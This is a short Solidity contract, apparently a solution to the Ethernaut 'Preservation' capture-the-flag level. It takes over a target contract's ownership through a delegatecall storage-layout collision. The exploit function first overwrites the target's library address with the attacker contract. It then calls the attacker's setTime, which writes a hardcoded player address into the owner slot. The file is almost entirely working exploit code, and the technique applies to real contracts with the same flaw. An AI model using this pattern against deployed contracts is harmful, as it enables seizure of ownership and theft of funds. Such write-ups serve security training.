//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel16.sol";

contract PreservationHack {
    //storage structure must be similar to Preservation contract
    address public t1;
    address public t2;
    address public owner;
    Preservation level16 =
        Preservation(0x463CBc47f135C7C5FDCC6827a288497bF8a91F8d);

    function exploit() external {
        //first delegate call to Preservation contract which makes this contract timeZoneLibrary1
        level16.setFirstTime(uint256(uint160(address(this))));

        //second delegatecall to PreservationHack contract since timezonelibrary1's address is now the preservation contract, the call will use this contract's setTime() function and make player the owner
        level16.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = 0x52D6eFC2994ebd93c883b5dA1d32a6cae6bE105B;
    }
}
